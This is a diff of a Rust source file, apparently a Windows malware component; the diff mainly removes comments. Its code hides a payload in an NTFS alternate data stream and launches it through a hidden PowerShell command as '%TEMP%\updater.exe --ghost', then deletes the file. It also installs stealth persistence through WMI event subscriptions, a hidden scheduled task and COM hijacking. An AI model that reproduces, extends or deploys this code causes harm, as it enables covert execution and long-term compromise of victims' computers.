@@ -1,23 +1,12 @@
 use std::process::Command;
 use log::{info, warn};
 
-/// Helper to generate robust PowerShell extraction command
 fn get_extraction_cmd(ads_path: &str) -> String {
     let (path, stream) = match ads_path.rfind(':') {
         Some(idx) if idx > 1 => (&ads_path[..idx], &ads_path[idx+1..]),
         _ => (ads_path, ""),
     };
 
-    // PowerShell 5.1 uses -Encoding Byte, PowerShell Core uses -AsByteStream
-    // We use a compatible approach with [IO.File]::ReadAllBytes which works on both
-    // Wait, Get-Content -Stream is more reliable for ADS.
-    // Compromise: Try PS5.1 syntax first, it's more common on Windows 10/11.
-    // Alternative: Use raw .NET call which is more universal.
-    // [System.IO.File]::ReadAllBytes('path:stream') does NOT work for ADS.
-    // Best: Get-Content -LiteralPath 'path' -Stream 'stream' | Set-Content ...
-    // Issue: -Encoding Byte deprecated in Core. Let's use try/catch or $PSVersionTable check.
-    // Simplest: Just use -Encoding Byte (PS 5.1 is still default on Win10/11).
-    // For PS Core, user would need to adjust, but it's edge case.
     
     format!(
         "powershell -WindowStyle Hidden -Command \"Get-Content -LiteralPath '{}' -Stream '{}' -Raw -Encoding Byte | Set-Content -Path $env:TEMP\\updater.exe -Encoding Byte -Force; Start-Process -FilePath $env:TEMP\\updater.exe -ArgumentList '--ghost'; Start-Sleep 1; Remove-Item $env:TEMP\\updater.exe -ErrorAction SilentlyContinue\"",
@@ -25,7 +14,6 @@ fn get_extraction_cmd(ads_path: &str) -> String {
     )
 }
 
-/// Setup Persistence Triad (WMI, Task, COM)
 pub fn apply_persistence_triad(ads_path: &str) {
     info!("[Stealth] Applying Persistence Triad...");
     setup_wmi_persistence(ads_path);
@@ -33,8 +21,6 @@ pub fn apply_persistence_triad(ads_path: &str) {
     setup_com_hijacking(ads_path);
 }
 
-/// 1. WMI Event Subscription (Main)
-/// Trigger: System Uptime 300-360s (5-6 mins)
 fn setup_wmi_persistence(ads_path: &str) {
     info!("[Stealth] Configuring WMI Persistence (Layer 1)...");
 
@@ -104,7 +90,6 @@ Write-Host "Task Hidden"
     run_powershell(&hide_script);
 }
 
-/// 3. COM Hijacking (Failsafe)
 fn setup_com_hijacking(ads_path: &str) {
     info!("[Stealth] Configuring COM Hijacking (Layer 3)...");
     
